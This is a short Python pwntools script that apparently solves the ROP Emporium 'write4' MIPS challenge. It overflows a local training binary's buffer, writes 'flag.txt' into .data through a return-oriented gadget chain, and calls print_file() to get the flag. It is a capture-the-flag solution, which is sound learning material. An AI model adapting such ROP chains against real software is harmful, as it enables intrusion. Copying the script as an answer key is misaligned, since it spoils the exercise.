#/usr/bin/python3
from pwn import process, p32, log

shell = process("./write4_mipsel")

offset = 36
junk = b"A" * offset

string = b"flag.txt"

payload  = b""
payload += junk

for i in range(0, len(string), 4):
    payload += p32(0x400930)     # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
    payload += p32(0x0)          # padding
    payload += string[i:i+4]     # string
    payload += p32(0x411000 + i) # .data

payload += p32(0x400948) # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
payload += p32(0x0)      # paddong
payload += p32(0x400a90) # print_file()
payload += p32(0x411000) # .data

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
